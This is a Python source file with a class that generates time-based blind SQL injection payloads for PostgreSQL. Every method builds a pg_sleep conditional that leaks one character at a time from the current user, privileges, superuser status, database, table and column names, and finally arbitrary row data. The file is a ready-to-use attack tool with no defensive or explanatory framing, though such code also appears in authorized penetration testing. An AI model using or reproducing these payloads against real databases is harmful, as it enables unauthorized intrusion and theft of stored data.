"""
File that generates SQLi payloads.

Author: Aleksa Zatezalo
Date: January 2025
"""

class PostgresPayloadGenerator:
    def __init__(self):
        self.sleep_time = 3

    def set_sleep_time(self, seconds: int):
        """Set the sleep time for time-based attacks"""
        self.sleep_time = seconds

    def current_user_payload(self, char_pos: int, char: str) -> str:
        """Generate payload to extract current database user"""
        return f"AND (SELECT CASE WHEN (SELECT substr(current_user,{char_pos},1)='{char}') " \
               f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"

    def current_privileges_payload(self, char_pos: int, char: str) -> str:
        """Generate payload to extract current user's privileges"""
        return f"AND (SELECT CASE WHEN (SELECT substr(string_agg(privilege_type, ','),{char_pos},1) " \
               f"FROM information_schema.role_table_grants WHERE grantee = current_user)='{char}' " \
               f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"

    def superuser_check_payload(self) -> str:
        """Generate payload to check if current user is superuser"""
        return f"AND (SELECT CASE WHEN (SELECT usesuper FROM pg_user " \
               f"WHERE usename = current_user) THEN pg_sleep({self.sleep_time}) " \
               f"ELSE pg_sleep(0) END)--"

    def database_enum_payload(self, char_pos: int, char: str) -> str:
        """Generate payload to enumerate database names"""
        return f"AND (SELECT CASE WHEN (SELECT substr(datname,{char_pos},1) " \
               f"FROM pg_database LIMIT 1)='{char}' THEN pg_sleep({self.sleep_time}) " \
               f"ELSE pg_sleep(0) END)--"

    def table_enum_payload(self, db_name: str, char_pos: int, char: str) -> str:
        """Generate payload to enumerate table names"""
        return f"AND (SELECT CASE WHEN (SELECT substr(tablename,{char_pos},1) " \
               f"FROM pg_tables WHERE schemaname='{db_name}' LIMIT 1)='{char}' " \
               f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"

    def column_enum_payload(self, table_name: str, char_pos: int, char: str) -> str:
        """Generate payload to enumerate column names"""
        return f"AND (SELECT CASE WHEN (SELECT substr(column_name,{char_pos},1) " \
               f"FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1)='{char}' " \
               f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"

    def data_extraction_payload(self, table_name: str, column_name: str, char_pos: int, 
                              char: str, row_offset: int) -> str:
        """Generate payload to extract data from columns"""
        return f"AND (SELECT CASE WHEN (SELECT substr(CAST({column_name} as varchar)," \
               f"{char_pos},1) FROM {table_name} OFFSET {row_offset} LIMIT 1)='{char}' " \
               f"THEN pg_sleep({self.sleep_time}) ELSE pg_sleep(0) END)--"